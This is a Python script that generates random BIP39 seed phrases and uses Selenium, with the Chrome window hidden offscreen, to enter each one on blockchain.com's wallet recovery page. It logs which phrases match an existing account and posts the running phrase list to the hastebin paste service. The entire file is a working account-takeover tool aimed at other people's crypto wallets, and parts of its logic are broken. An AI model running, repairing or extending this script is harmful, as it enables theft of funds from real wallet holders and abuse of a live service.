# Importing all the modules needed
import time
import sys
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import re
import datetime
from selenium.common.exceptions import NoSuchElementException        
from mnemonic import Mnemonic
import pyautogui
import pyperclip
from selenium.webdriver.common.keys import *
from selenium.webdriver import ActionChains
import json, requests, sys
from xml.dom.expatbuilder import theDOMImplementation
import urllib.request 
from bs4 import BeautifulSoup
from urllib.request import Request, urlopen  # Python 3

mnemo = Mnemonic("english")
words = mnemo.generate(strength=128)

with open("final_url.txt", "r") as f3:
    final_url = f3.readlines()
    final_url_str = str(final_url)
    f3.close()

n = int(input("Enter the number of times you want to try: "))

    
for i in range (1,n):
    
    mnemo = Mnemonic("english")
    words = mnemo.generate(strength=128)

    # opening the url for reading
    html = Request(final_url_str, headers={'User-Agent': 'Mozilla/5.0'})

    # parsing the html file
    htmlParse = BeautifulSoup(final_url_str, 'html.parser')
    html_parse_str = str(htmlParse)
    with open("memos.txt","a") as f:
        f.write('\n')
        f.write(html_parse_str)
        f.close()
    with open("memos.txt", "r") as file1:
        readfile = file1.read()
  
    # checking condition for string found or not
        if words in readfile: 
            print('String[', words, ']Found In File')
            
            sys.exit()
        else:
            driver = webdriver.Chrome('./chromedriver')
            driver.set_window_position(-10000, 0)
            driver.set_window_size(1, 1)


            driver.get("https://login.blockchain.com/en/#/recover")
            time.sleep(5)
            recovery_phrase_btn = driver.find_element_by_css_selector("#app > div > div.sc-iGPElx.lnOPvk > form > div > div.sc-eLdqWK.grWATK > div.sc-hUMlYv.bhEOjU > div.sc-ESoVU.hyzIIh > span")
            recovery_phrase_btn.click()
            time.sleep(1)
            
            enter_phrase_box = driver.find_element_by_css_selector("#app > div > div.sc-iGPElx.lnOPvk > form > form > div > div.sc-eLdqWK.grWATK > div.sc-gbzWSY.kXwdAy > div.sc-cZBZkQ.QTIWd > textarea")
            enter_phrase_box.click()
            
            time.sleep(0.1)
            enter_phrase_box.send_keys(words)
            
            time.sleep(1)
            continue_btn = driver.find_element_by_css_selector("#app > div > div.sc-iGPElx.lnOPvk > form > form > div > div.sc-eLdqWK.grWATK > button")
            continue_btn.click()
            
            time.sleep(5)
            if driver.find_elements_by_xpath('//*[@id="app"]/div/div[3]/form/form/div/div/div[3]'):
                with open("results.txt","a") as f:
                    f.write("")
                    f.write(words)
                    f.write('\n')
                    f.write("Account not found with this phrase")
                    print("Account not found with this phrase")
                    f.write('\n')
                    f.write('\n')
                    f.close()
            else:
                text = driver.find_element_by_css_selector('#app > div > div.sc-iGPElx.lnOPvk > form > form > div.sc-dHmInP.eBfKSs > form > button')
                text_content = text.get_attribute('innerHTML')
                with open("results.txt","a") as f:
                    f.write("")
                    f.write(words)
                    f.write('\n')
                    f.write("Account found with this phrase!")
                    print("Account found with this phrase!")
                    f.write('\n')
                    f.write('\n')
                    f.close()
            with open("memos.txt","a") as file1:
                file1.write('\n')
                file1.write(words)
                file1.write('\n')
                print("Writing the phrase [",words,"] to memos.txt")
                file1.close()

            driver.close()
            URL = "http://hastebin.com"

            if sys.stdin.isatty():
                with open('memos.txt', 'r') as filedata:
                    data = "".join(filedata.readlines()).strip()
                    filedata.close()
            else:
                with open('memos.txt', 'r') as filedata:
                    data = "".join(sys.stdin.readlines()).strip()
                    filedata.close()
            response = requests.post(URL + "/documents", data)
            # sys.stdout.write("%s/%s\n" % (URL, json.loads(response.text)['key']))
            

            response_text_str = str(response.text)
            response_text_str_key = response_text_str.replace('"','')
            response_text_str_key = response_text_str_key.replace('{','')
            response_text_str_key = response_text_str_key.replace('}','')
            response_text_str_key = response_text_str_key.replace('key','')
            response_text_str_key = response_text_str_key.replace(':','')

            final_url_str = 'https://www.toptal.com/developers/hastebin/raw/' + response_text_str_key
            print(final_url_str)
            # final_url_str = Request(final_url_str, headers={'User-Agent': 'Mozilla/5.0'})
with open("final_url.txt", "w") as f3:
    f3.write(final_url_str)
    f3.close()